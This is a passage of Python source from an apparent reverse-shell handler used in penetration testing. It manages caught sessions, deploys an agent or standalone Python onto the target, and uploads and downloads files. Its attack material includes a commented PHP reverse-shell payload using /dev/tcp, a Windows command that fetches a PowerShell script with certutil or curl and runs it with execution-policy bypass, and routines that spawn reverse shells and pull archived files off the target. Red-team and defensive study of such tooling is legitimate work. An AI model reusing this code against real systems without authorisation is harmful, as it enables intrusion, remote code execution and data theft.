							check = self.subchannel.pattern.search(buffer.getvalue())
							if check:
								logger.debug(paint('Got all data!').green)
								self.subchannel.result = check[1]
								break
							logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

						elif expect_func:
							if expect_func(buffer.getvalue()):
								logger.debug(paint("The expected strings found in data").yellow)
								self.subchannel.result = buffer.getvalue()
							else:
								logger.debug(paint('No expected strings found in data. Receive again...').yellow)

						else:
							logger.debug(paint('Maybe got all data !?').yellow)
							self.subchannel.result = buffer.getvalue()
							break
			except Exception:
				self.subchannel.can_use = False
				self.subchannel.result = False

			_stop = time.perf_counter()
			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

			if value and self.subchannel.result is not False:
				if self.OS == 'Windows' and self.type == 'PTY': # quirk
					self.subchannel.result = re.sub(rb'\x1b\[(?:K|\?25h|25l|82X)', b'', self.subchannel.result)
				self.subchannel.result = self.subchannel.result.strip().decode(errors="replace") # TODO check strip
			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")

			result, self.subchannel.result, self.subchannel.pattern = self.subchannel.result, None, None

			if separate:
				if not result:
					with self.data_route_lock:
						self.subchannel.active = False
					return False
				marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
				idx = result.find(marker, Messenger.LEN_BYTES)
				if idx < 0:
					with self.data_route_lock:
						self.subchannel.active = False
					return False
				framed_result = result[idx - Messenger.LEN_BYTES:]
				buffer = io.BytesIO()
				for _type, _value in self.messenger.feed(framed_result):
					buffer.write(_value)
				with self.data_route_lock:
					self.agent = True
					self.subchannel.active = False
				return buffer.getvalue()

			with self.data_route_lock:
				self.subchannel.active = False

			return result

	def remote_tarfile_ok(self):
		"""Whether the remote agent python can extract tar archives itself.
		Some minimal python builds ship without tarfile; for those, uploads
		fall back to pushing base64 chunks and unpacking with the remote tar
		binary instead of failing with 'No module named tarfile'."""
		if self._remote_tarfile is None:
			try:
				response = self.exec("""
				try:
					import tarfile
					stdout_stream << b'ariadne-tarfile-ok'
				except Exception as e:
					stdout_stream << str(e).encode()
				""", python=True, value=True)
				self._remote_tarfile = (response == 'ariadne-tarfile-ok')
			except Exception:
				self._remote_tarfile = False
			if not self._remote_tarfile:
				logger.warning("Remote python has no tarfile module; uploads will use base64 chunks + tar")
		return self._remote_tarfile

	def _deploy_standalone_python(self, url_key):
		if not url_key:
			return False
		archive = self.need_binary("Standalone Python", URLS[url_key])
		if not archive:
			return False
		q = shlex.quote(archive)
		path = self.exec(
			f'D="$(dirname {q})" && tar -xzf {q} -C "$D" 2>/dev/null && '
			f'rm -f {q} && '
			f'"$D/python/bin/python3" -c "import sys;print(sys.executable)" 2>/dev/null',
			value=True
		)
		return path if (isinstance(path, str) and path.startswith("/")) else False

	def need_binary(self, name, url):
		if self.OS == "Unix" and not self.exec_tmp:
			logger.error(f"No writable+executable directory on the target; cannot deploy {name}")
			return False

		def make_dest():
			if self.OS != "Unix":
				return self.tmp
			d = self.exec(f'mktemp -d {shlex.quote(self.exec_tmp + "/XXXXXXXXXX")} 2>/dev/null', value=True)
			if not (isinstance(d, str) and d.startswith("/")):
				logger.error(f"Could not create a temp directory for {name}")
				return None
			self.uploaded_paths[shlex.quote(d)] = int(time.time())
			return d
		_options = (
			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
			f"\n  2) Upload local {name} binary"
			f"\n  3) Specify remote {name} binary path"
			 "\n  4) None of the above\n"
		)
		while True:
			print(paint(_options).magenta)
			answer = ask("Select action: ")

			if answer == "1":
				dest = make_dest()
				if not dest:
					return False
				uploaded = self.upload(url, remote_path=dest)
				return uploaded[0] if uploaded else False

			elif answer == "2":
				local_path = ask(f"Enter {name} local path: ")
				if local_path:
					if os.path.exists(local_path):
						dest = make_dest()
						if not dest:
							return False
						uploaded = self.upload(local_path, remote_path=dest)
						return uploaded[0] if uploaded else False
					else:
						logger.error("The local path does not exist...")

			elif answer == "3":
				remote_path = ask(f"Enter {name} remote path: ")
				if remote_path:
					if not self.exec(f"test -f {remote_path} || echo x"):
						return remote_path
					else:
						logger.error("The remote path does not exist...")

			elif answer == "4":
				return False

			elif not answer and not sys.stdin.isatty():
				return False

	def upgrade(self):
		self.upgrade_attempted = True
		if self.OS == "Unix":
			if self.agent:
				logger.warning("Python Agent is already deployed")
				return False

			self.shell = self.bin['bash'] or self.bin['sh']
			if not self.shell:
				logger.error("Cannot detect shell. Abort upgrading...")
				return False

			if not self.has_persistent_shell:
				logger.warning(
					"Non-persistent shell (fresh process per command); the Python "
					"agent cannot attach in-band. Spawning a persistent reverse "
					"shell on the same listener to upgrade."
				)
				if self.spawn():
					self.type = 'Readline'
					return True
				logger.error("Could not spawn a persistent shell for upgrade")
				if readline:
					self.type = 'Readline'
					return True
				return False

			standalone_file = self.directory / "standalone_python"
			if not self.standalone_python and standalone_file.exists():
				self.standalone_python = standalone_file.read_text().strip()
				self._bin['python3'] = self.standalone_python
				self._can_deploy_agent = None
				logger.debug(f"Reusing standalone python from previous shell: {self.standalone_python}")

			if self.can_deploy_agent:
				logger.debug("Attempting to deploy Python Agent...")
				_bin = self.bin['python3'] or self.bin['python']
				if self.remote_python_version >= (3,):
					_decode = 'b64decode'
					_exec = 'exec(cmd, globals(), locals())'
				else:
					_decode = 'decodestring'
					_exec = 'exec cmd in globals(), locals()'

				agent, payload, cmd = _agent_deploy_command(
					_bin, AGENT, _decode,
					repr(self.shell),
					options.network_buffer_size,
					MESSENGER,
					STREAM,
					repr(self.bin['sh'] or self.bin['bash']),
					_exec
				)

				if self.pty_ready:
					self.exec("stty -echo")
					self.echoing = False

				elif self.interactive:
					# Some shells are unstable in interactive mode
					# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
					# Silently convert the shell to non-interactive before PTY upgrade.
					self.interactive = False
					self.exec(f"exec {shlex.quote(self.shell)}", raw=True, timeout=max(self.latency or 0, 0.5))
					self.echoing = False

				shell_marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
				response = self.exec(
					f'export TERM=xterm-256color; export SHELL={shlex.quote(self.shell)}; {cmd}',
					separate=True,
					expect_func=lambda data: shell_marker in data,
					raw=True
				)
				if not isinstance(response, bytes):
					if self.standalone_python:
						logger.error("The standalone agent crashed the shell. I am killing it, sorry...")
						standalone_file = self.directory / "standalone_python"
						if standalone_file.exists():
							standalone_file.unlink()
					else:
						logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will use a standalone python")
						Path(self.directory / ".noagent").touch()

					self.kill()
					return False

				logger.info(f"Agent deployed via {paint(_bin).green}")

				self.type = 'PTY'
				self.interactive = True
				self.echoing = True
				self.prompt = response
				self.get_shell_info()
				if self.standalone_python:
					(self.directory / "standalone_python").write_text(self.standalone_python)
				return True

			if not self.upgrade_standalone_attempted:
				self.upgrade_standalone_attempted = True
				logger.error("Cannot deploy agent with remote Python. Select an action below:")
				key = (self.system, self.arch, self.libc) if self.system == 'Linux' else (self.system, self.arch)
				dyn_key = PYTHON_STANDALONE_BINARIES.get(key)
				python_binary = self._deploy_standalone_python(dyn_key)
				if not python_binary:
					logger.error(f'Failed to deploy standalone python for {self.system} {self.arch} ({self.libc})')
					return False

				self.standalone_python = python_binary
				self._can_deploy_agent = None
				self._bin['python3'] = python_binary
				return self.upgrade()

			logger.error("Cannot deploy agent...")
			if readline:
				logger.info("Readline support enabled")
				self.type = 'Readline'
				return True
			else:
				logger.error("Falling back to Raw shell")
				return False

		elif self.OS == "Windows":
			if self.type != 'PTY':
				self.type = 'Readline'
				logger.info("Added readline support...")

		return True

	def update_pty_size(self):
		columns, lines = shutil.get_terminal_size()
		if self.OS == 'Unix':
			if self.agent:
				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
		elif self.OS == 'Windows': # TODO
			pass

	def readline_loop(self):
		while core.attached_session == self:
			try:
				cmd = input("\033[s\033[u", self.histfile, options.histlength, None, "\t") # TODO
				if self.subtype == 'cmd':
					assert len(cmd) <= MAX_CMD_PROMPT_LEN
				#self.record(b"\n" + cmd.encode(), _input=True)

			except EOFError:
				self.detach()
				break
			except (KeyboardInterrupt, OSError):
				break
			except AssertionError:
				logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
			else:
				if core.attached_session == self:
					self.record(cmd.encode() + b"\n", _input=True)
					self.send(cmd.encode() + b"\n")

	def attach(self):
		if threading.current_thread().name != 'Core':
			self.attaching = True
			if self.new:
				upgrade_conditions = [
					not options.no_upgrade,
					not self.upgrade_attempted
				]
				if all(upgrade_conditions):
					self.upgrade()
				if self.prompt:
					self.record(self.prompt)
				self.new = False
				for module in modules().values():
					if module.enabled and module.on_first_attach:
						module.run(self, None)
			if not self.attaching:
				return False
			core.control << (lambda: core.sessions[self.id].attach())
			return True

		if core.attached_session is not None:
			self.attaching = False
			return False

		if self.type == 'PTY':
			escape_key = options.escape['key']
		elif self.type == 'Readline':
			escape_key = 'Ctrl-D'
		else:
			escape_key = 'Ctrl-C'

		logger.info(
			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
			f"{paint(' •').green} {paint(self.type).CYAN_white}{paint(' • Menu key').green} "
			f"{paint(escape_key).MAGENTA_white} <-"
		)

		if not options.no_log:
			logger.info(f"Session log: {paint(self.logpath).yellow_DIM}")
		print(paint('─' * shutil.get_terminal_size()[0]).darkgrey)

		core.attached_session = self
		core._paste_state[0] = b''
		self.attaching = False
		menu.active.clear()
		core.rlist.append(sys.stdin)

		stdout(bytes(self.last_lines))

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
			os.kill(os.getpid(), signal.SIGWINCH)

		elif self.type == 'Readline':
			self._readline_thread = threading.Thread(target=self.readline_loop, daemon=True)
			self._readline_thread.start()

		self._cwd = None
		return True

	def sync_cwd(self):
		self._cwd = None
		if self.agent:
			self.exec(f"os.chdir({self.cwd!r})", python=True, value=True)

	def get_subtype(self):
		response = self.exec("$PSVersionTable", expect_func=lambda x: b":\\" in x, raw=True)
		if response:
			if b"SerializationVersion" in response:
				self.subtype = 'psh'
			else:
				self.subtype = 'cmd'

	def detach(self):
		if self and self.OS == 'Unix' and self.agent:
			threading.Thread(target=self.sync_cwd).start()

		if self and self.OS == 'Windows' and self.type != 'PTY':
			threading.Thread(target=self.get_subtype).start()

		if threading.current_thread().name != 'Core':
			core.control << (lambda: core.sessions[self.id].detach())
			return

		if core.attached_session is None:
			return False

		core.wait_input = False
		core.attached_session = None
		core.rlist.remove(sys.stdin)

		if self.type == 'Readline':
			if hasattr(self, '_readline_thread') and self._readline_thread.is_alive():
				self._readline_thread.join(timeout=2)

		if self.type == 'PTY':
			restore_tty()

		if self.id in core.sessions:
			print()
			logger.warning("Session detached")
			menu.set_id(self.id)
		else:
			if options.single_session and not core.sessions:
				core.stop()
				logger.info("Ariadne exited due to Single Session mode")
				return
			menu.set_id(None)
		menu.show()

		return True

	@persistent_shell_only
	@prefer_agent
	@require('tar', 'base64', 'tr', 'cut', 'du')
	def download(self, remote_items, download_folder=None, reroot=False):
		if self.OS == 'Windows' and remote_items.count('"') % 2:
			remote_items += '"'
		# Initialization
		try:
			parts = shlex.split(remote_items, posix=(self.OS != 'Windows'))
		except ValueError as e:
			logger.error(e)
			return []

		strip_prefixes = None
		if reroot:
			strip_prefixes = sorted(
				{os.path.dirname(os.path.normpath(os.path.join(self.cwd, p))).lstrip('/') for p in parts},
				key=len, reverse=True)

		local_download_folder = Path(os.path.abspath(normalize_path(download_folder))) if download_folder else self.directory / "downloads"
		try:
			local_download_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return []

		if self.OS == 'Unix':
			# Check for local available space
			available_bytes = shutil.disk_usage(local_download_folder).free
			if self.agent:
				block_size = os.statvfs(local_download_folder).f_frsize
				response = self.exec(f"{GET_GLOB_SIZE}"
					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size}, {repr(options.link_dereference)})).encode()",
					python=True,
					value=True
				)
				try:
					remote_size = int(float(response))
				except Exception:
					logger.error(response)
					return []
			else:
				cmd = f"du -ck {' '.join(shell_escape_glob(os.path.normpath(os.path.join(self.cwd, part))) for part in shlex.split(remote_items))}"
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot determine remote size")
					return []
				last_fields = response.splitlines()[-1].split()
				if not (last_fields and last_fields[0].isdigit()):
					logger.error("Cannot determine remote size")
					return []
				remote_size = int(last_fields[0]) * 1024

			need = remote_size - available_bytes

			if need > 0:
				logger.error(
					f"--- Not enough space to download... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Packing and downloading
			# Agent pythons without tarfile fall through to the shell-side
			# tar + base64 method below.
			agent_stream_download = self.agent and self.remote_tarfile_ok()
			if agent_stream_download:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdout_stream, stderr_stream]):
					return []

				code = fr"""
				from glob import glob
				items = []
				for part in shlex.split({repr(remote_items)}):
					_items = glob(normalize_path(part))
					if _items:
						items.extend(_items)
					else:
						items.append(part)
				import tarfile, zlib
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				_compression = {{}}
				if sys.version_info >= (3, 12):
					_compression['compresslevel'] = {self.compression_level}
				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream, dereference={repr(options.link_dereference)}, bufsize=NET_BUF_SIZE, **_compression)
				if not _compression:
					try:
						tar.fileobj.cmp = zlib.compressobj({self.compression_level}, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
					except:
						pass
				def handle_exceptions(func):
					def inner(*args, **kwargs):
						try:
							func(*args, **kwargs)
						except:
							stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
					return inner
				tar.add = handle_exceptions(tar.add)
				for item in items:
					try:
						tar.add(os.path.abspath(item))
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""

				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				logger.trace(paint(f"Downloading to {local_download_folder}").cyan)
				def drain_stderr():
					dec = codecs.getincrementaldecoder('utf-8')(errors='replace')
					error_buffer = ''
					while True:
						try:
							select([stderr_stream], [], [])
							data = stderr_stream.read(options.network_buffer_size)
						except (OSError, ValueError):
							break
						if data:
							error_buffer += dec.decode(data)
							while '\n' in error_buffer:
								line, error_buffer = error_buffer.split('\n', 1)
								logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
						else:
							error_buffer += dec.decode(b'', final=True)
							break
				stderr_thread = threading.Thread(target=drain_stderr)
				stderr_thread.start()

				tar_source, mode = stdout_stream, "r|gz"
			else:
				remote_items = ' '.join([shell_escape_glob(os.path.normpath(os.path.join(self.cwd, part))) for part in shlex.split(remote_items)])
				remote_tmp = self.tmp
				if not remote_tmp:
					logger.error("No writable directory available on target for download staging")
					return []
				temp = remote_tmp + "/" + rand(8)
				qtemp = shlex.quote(temp)
				self.uploaded_paths[qtemp] = int(time.time())
				def remove_remote_download_temp():
					if not self:
						return False
					removed = self.exec(f"rm -f -- {qtemp}; echo $?", value=True)
					if isinstance(removed, str) and removed.strip() == "0":
						self.uploaded_paths.pop(qtemp, None)
						return True
					return False
				cmd = rf'tar -czf - {"-h " if options.link_dereference else ""}{remote_items}|base64|tr -d "\n" > {qtemp}'
				response = self.exec(cmd, timeout=None, value=True)
				if response is False:
					remove_remote_download_temp()
					logger.error("Cannot create archive")
					return []
				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
				for error in errors:
					logger.error(error)
				send_size = self.exec(
					rf"_s=$( (stat -x {qtemp} 2>/dev/null || stat {qtemp} 2>/dev/null) "
					rf"| sed -n 's/.*Size: \([0-9]*\).*/\1/p' 2>/dev/null ); "
					rf'[ -n "$_s" ] && echo "$_s" || wc -c < {qtemp}',
					value=True
				)
				if not (isinstance(send_size, str) and send_size.strip().isdigit()):
					remove_remote_download_temp()
					logger.error("Could not determine the remote file size")
					return []
				send_size = int(send_size)

				logger.trace(paint(f"Downloading to {local_download_folder}").cyan)
				pbar = PBar(send_size, caption=" ", barlen=30, metric=Size, reverse=True)
				b64data = io.BytesIO()
				for offset in range(0, send_size, options.download_chunk_size):
					# Agent EXEC must wait for the child and return its output.
					if self.agent:
						response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {qtemp}", value=True)
					else:
						response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {qtemp}")
					if response is False:
						pbar.terminate()
						logger.error("Download interrupted")
						if not remove_remote_download_temp():
							logger.warning(f"Remote temporary file may remain: {temp}")
						return []
					b64data.write(response)
					pbar.update(len(response))
				if not remove_remote_download_temp():
					logger.warning(f"Remote temporary file may remain: {temp}")

				try:
					raw = base64.b64decode(b64data.getvalue())
				except Exception:
					logger.error("Invalid data returned")
					return []
				b64data.close()

				tar_source, mode = io.BytesIO(raw), "r:gz"
				del raw

			# Local extraction
			def cleanup_agent_download():
				if not agent_stream_download:
					return True
				for action in (
					lambda: stdin_stream.write(b""),
					stdin_stream.close_read, stdin_stream.close_write,
					stdout_stream.close_read,
				):
					try:
						action()
					except Exception:
						pass
				stderr_thread.join(timeout=2)
				try:
					stderr_stream.close_read()
				except Exception:
					pass
				if stderr_thread.is_alive():
					stderr_thread.join(timeout=2)
				cleanup_complete = not stderr_thread.is_alive()
				for stream in (stdin_stream, stdout_stream, stderr_stream):
					self.remove_stream(stream)
				return cleanup_complete

			try:
				tar = tarfile.open(mode=mode, fileobj=tar_source, bufsize=options.network_buffer_size)
			except Exception:
				cleanup_agent_download()
				logger.error("Invalid data returned")
				return []

			pbar = None
			if self.agent and remote_size:
				pbar = PBar(remote_size, caption=" ", barlen=30, metric=Size, reverse=True)
				_oread = tar.fileobj.read
				def _read_pbar(*a, _oread=_oread, _pbar=pbar, **k):
					data = _oread(*a, **k)
					if data:
						_pbar.update(len(data))
					return data
				tar.fileobj.read = _read_pbar

			extraction_error = None
			cleanup_complete = True
			try:
				extracted = safe_tar_extractall(tar, local_download_folder, streaming=agent_stream_download, strip_prefixes=strip_prefixes)
			except Exception as e:
				extraction_error = e
				if pbar:
					pbar.terminate()
				logger.debug(traceback.format_exc())
				logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
				logger.warning("Download failed; partially extracted local files may remain")
			finally:
				try:
					tar.close()
				finally:
					cleanup_complete = cleanup_agent_download()
			if extraction_error:
				return []
			if not cleanup_complete:
				logger.error("Download stream cleanup timed out; outcome is indeterminate")
				return []

			if pbar:
				pbar.update(pbar.end)

			if self.agent:
				# Get the remote absolute paths
				response = self.exec(f"""
				from glob import glob
				remote_paths = ''
				for part in shlex.split({repr(remote_items)}):
					result = glob(normalize_path(part))
					if not result and os.path.exists(part):
						result = [part]
					if result:
						for item in result:
							if os.path.exists(item):
								remote_paths += "1\\t" + os.path.abspath(item) + "\\n"
					else:
						remote_paths += "0\\t" + part + "\\n"
				stdout_stream << remote_paths.encode()
				""", python=True, value=True)
			else:
				cmd = (
					f' for file in {remote_items}; do if [ -e "$file" ]; then'
					' printf "1\\t%s\\n" "$file";'
					' else printf "0\\t%s\\n" "$file"; fi; done'
				)
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot get remote paths")
					return []

			remote_results = []
			for line in response.splitlines():
				status, separator, path = line.partition('\t')
				if separator and status in ('0', '1'):
					remote_results.append((status == '1', path))
				else:
					remote_results.append((True, line))

			# Present the downloads
			downloaded = []
			if reroot:
				base = os.path.realpath(local_download_folder)
				tops = {os.path.relpath(p, base).split(os.sep)[0] for p in extracted}
				downloaded = [local_download_folder / t for t in sorted(tops)]
				downloaded_names = {path.name for path in downloaded}
				for exists, path in remote_results:
					name = os.path.basename(path.rstrip('/'))
					if not exists or (name and name not in downloaded_names):
						logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")
			else:
				extracted_realpaths = {os.path.realpath(item) for item in extracted}
				for exists, path in remote_results:
					local_path = local_download_folder / path[1:]
					if exists and os.path.isabs(path) and os.path.realpath(local_path) in extracted_realpaths:
						downloaded.append(local_path)
					else:
						logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")

		elif self.OS == 'Windows':

			with ExitStack() as stack:
				remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
				remote_paths = [t.strip('"') for t in shlex.split(remote_items, posix=False)]

				with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False) as f:
					tempfile_ps1 = f.name
					stack.callback(lambda p=tempfile_ps1: os.path.exists(p) and os.remove(p))
					f.write(windows_zip_script(remote_paths, remote_tempfile))

				server = FileServer(port=0, host=self._host, url_prefix=rand(8), quiet=True)
				urlpath_ps1 = server.add(tempfile_ps1)
				temp_remote_file_ps1 = urlpath_ps1.split("/")[-1]

				server.start()
				stack.callback(lambda: server.term.wait(options.timeout_short))
				stack.callback(lambda: server.stop())
				server.init.wait(options.timeout_short)

				if not hasattr(server, 'id'):
					return []

				_url = f'http://{self._host}:{server.port}{urlpath_ps1}'
				_dest = f'%TEMP%\\{temp_remote_file_ps1}'
				data = self.exec(
					f'(certutil -urlcache -split -f "{_url}" "{_dest}" >NUL 2>&1'
					f' || curl -s -o "{_dest}" "{_url}" 2>NUL'
					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\\"{_url}\\",\\"{_dest}\\")")'
					f'&powershell -nop -ep bypass -File "{_dest}"&del "{_dest}"',
					force_cmd=True,
					value=True,
					timeout=None
				)

			if not data:
				return []
			downloaded = set()
			try:
				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
					for item in zipdata.infolist():
						item.filename = item.filename.replace('\\', '/')
						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
						newpath = Path(zipdata.extract(item, path=local_download_folder))

			except zipfile.BadZipFile:
				logger.error("Invalid zip format")

			except binascii_error:
				logger.error("The item does not exist or access is denied")

		for item in downloaded:
			logger.info(f"{paint('Downloaded').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}")

		return downloaded

	@persistent_shell_only
	@prefer_agent
	@require('base64', 'tar', 'cat')
	def upload(self, local_items, remote_path=None, randomize_fname=False, url_to_bytes_fn=None):

		url_to_bytes_fn = url_to_bytes_fn or url_to_bytes
		destination = remote_path or self.cwd
		if self.OS == 'Unix':
			destination = self.resolve_remote_path(destination)
			if not destination:
				logger.error(f"Cannot resolve remote destination: {remote_path or self.cwd}")
				return []

		if not self.write_access(destination):
			return []

		# Initialization
		try:
			local_items = [item if re.match(r'(http|ftp)s?://', item, re.IGNORECASE)\
				 else normalize_path(item) for item in shlex.split(local_items)]

		except ValueError as e:
			logger.error(e)
			return []

		# Resolve items
		resolved_items = []
		for item in local_items:
			# Download URL
			if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
				try:
					filename, item = url_to_bytes_fn(item)
					if not item:
						continue
					resolved_items.append((filename, item))
				except Exception as e:
					logger.error(e)
			else:
				try:
					if os.path.isabs(item):
						items = list(Path('/').glob(item.lstrip('/')))
					else:
						items = list(Path().glob(item))
				except (ValueError, IndexError, NotImplementedError):
					# Path.glob() refuses '.', './' and '' outright, and `upload /`
					# reduces to the empty pattern. The exception differs by version
					# (IndexError up to 3.12, ValueError from 3.13). They are still
					# valid paths, so fall through to the existence check below.
					items = []
				if items:
					resolved_items.extend(items)
				elif os.path.lexists(item):
					resolved_items.append(Path(item))
				else:
					logger.error(f"No such file or directory: {item}")

		if not resolved_items:
			return []

		if self.OS == 'Unix':
			# Get remote available space
			remote_space = remote_block_size = None
			if self.agent:
				response = self.exec(f"""
				stats = os.statvfs(normalize_path({destination!r}))
				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
				""", python=True, value=True)

				if isinstance(response, str) and response.count(';') == 1:
					remote_available_blocks, remote_block_size = response.split(';')
					if remote_available_blocks.isdigit() and remote_block_size.isdigit():
						remote_block_size = int(remote_block_size)
						remote_space = int(remote_available_blocks) * remote_block_size
			else:
				remote_block_size = self.exec(rf'stat -c "%o" {shlex.quote(destination)} 2>/dev/null || stat -f "%k" {shlex.quote(destination)}', value=True)
				if isinstance(remote_block_size, str) and remote_block_size.isdigit():
					remote_block_size = int(remote_block_size)
				else:
					remote_block_size = None
				remote_available_kb = self.exec(f"df -k {shlex.quote(destination)}|tail -1|awk '{{print $4}}'", value=True)
				if isinstance(remote_available_kb, str) and remote_available_kb.isdigit():
					remote_space = int(remote_available_kb) * 1024

			if not remote_block_size:
				remote_block_size = 4096  # fallback
				logger.warning("Could not determine remote block size; assuming 4096")

			# Calculate local size
			local_size = 0
			for item in resolved_items:
				if isinstance(item, tuple):
					local_size += ceil(len(item[1]) / remote_block_size) * remote_block_size
				else:
					local_size += get_glob_size(shlex.quote(str(item)), remote_block_size, options.link_dereference)

			# Check required space
			if remote_space is None:
				logger.warning("Could not determine remote free space; proceeding without the space check")
			else:
				need = local_size - remote_space
				if need > 0:
					logger.error(
						f"--- Not enough space on target... {paint('We need ').blue}"
						f"{paint().yellow}{need:,}{paint().blue} more bytes..."
					)
					return []

			# Start Uploading
			# Agent sessions whose remote python lacks tarfile take the plain
			# base64 + remote-tar path below instead of stream-extracting.
			agent_stream_upload = self.agent and self.remote_tarfile_ok()
			if agent_stream_upload:
				size_tar = tarfile.open(fileobj=io.BytesIO(), mode='w', dereference=options.link_dereference)
				def tar_data_size(path, arcname):
					try:
						info = size_tar.gettarinfo(str(path), arcname)
					except (OSError, ValueError):
						return 0
					if info is None:
						return 0
					total = info.size if info.isfile() else 0
					if info.isdir():
						try:
							children = sorted(os.listdir(path))
						except OSError:
							return total
						for child in children:
							total += tar_data_size(Path(path) / child, os.path.join(arcname, child))
					return total

				upload_size = 0
				for item in resolved_items:
					if isinstance(item, tuple):
						upload_size += len(item[1])
					else:
						upload_size += tar_data_size(item, item.name)
				size_tar.close()

				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID
				agent_streams = tuple(stream for stream in (stdin_stream, stdout_stream, stderr_stream) if stream)
				monitor_thread = None
				upload_eof_sent = False

				def cleanup_agent_upload(wait_for_remote=True):
					nonlocal upload_eof_sent
					if stdin_stream and not upload_eof_sent:
						try:
							stdin_stream.write(b"")
						except Exception:
							pass
						upload_eof_sent = True

					if wait_for_remote and monitor_thread:
						while monitor_thread.is_alive() and self:
							monitor_thread.join(timeout=0.25)

					for stream in agent_streams:
						for close in (stream.close_read, stream.close_write):
							try:
								close()
							except Exception:
								pass

					if monitor_thread and monitor_thread.is_alive():
						monitor_thread.join(timeout=2)
					cleanup_complete = not (monitor_thread and monitor_thread.is_alive())

					for stream in agent_streams:
						self.remove_stream(stream)
					return cleanup_complete

				if not all([stdin_stream, stdout_stream, stderr_stream]):
					cleanup_agent_upload(wait_for_remote=False)
					return []

				code = rf"""
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				def _progress_tar(base, out):
					class ProgressTar(base):
						def _copy_progress(self, src, dst, length):
							remaining = length
							while remaining:
								buf = src.read(min(NET_BUF_SIZE, remaining))
								if not buf:
									raise IOError('unexpected end of data')
								dst.write(buf)
								out << (str(len(buf)) + '\n').encode()
								remaining -= len(buf)

						def makefile(self, tarinfo, targetpath):
							source = self.fileobj
							source.seek(tarinfo.offset_data)
							# A pre-existing file may be owned by a foreign uid
							# (e.g. an earlier upload that restored the operator's
							# uid); overwriting it can fail with EACCES even for
							# root on hardened kernels, so unlink it first.
							try:
								os.remove(targetpath)
							except OSError:
								pass
							target = open(targetpath, 'wb')
							try:
								sparse = getattr(tarinfo, 'sparse', None)
								if sparse is not None:
									for offset, size in sparse:
										target.seek(offset)
										self._copy_progress(source, target, size)
									target.seek(tarinfo.size)
									target.truncate()
								else:
									self._copy_progress(source, target, tarinfo.size)
							finally:
								target.close()
					return ProgressTar

				ProgressTar = _progress_tar(tarfile.TarFile, stdout_stream)
				tar = ProgressTar.open(name='', mode='r|gz', fileobj=stdin_stream, bufsize=NET_BUF_SIZE)
				tar.errorlevel = 1
				for item in tar:
					try:
						if sys.version_info >= (3, 12):
							tar.extract(item, path=normalize_path({destination!r}), filter='fully_trusted')
						else:
							tar.extract(item, path=normalize_path({destination!r}))
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""
				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				logger.trace(paint(f"Uploading to {destination}").cyan)
				tar_destination, mode = stdin_stream, "r|gz"
				pbar = PBar(upload_size, caption=" ", barlen=30, metric=Size) if upload_size else None
				remote_errors = []

				def monitor_remote():
					out_buf = b''
					err_buf = b''
					out_open = True
					err_open = True
					while out_open or err_open:
						watch = []
						if out_open:
							watch.append(stdout_stream)
						if err_open:
							watch.append(stderr_stream)
						try:
							readable, _, _ = select(watch, [], [])
						except (OSError, ValueError):
							break
						if stdout_stream in readable:
							try:
								data = stdout_stream.read(options.network_buffer_size)
							except (OSError, ValueError):
								data = b''
							if data:
								out_buf += data
								while b'\n' in out_buf:
									line, out_buf = out_buf.split(b'\n', 1)
									if pbar and line.strip().isdigit():
										remaining = max(0, pbar.end - pbar.pos - 1)
										pbar.update(min(int(line), remaining))
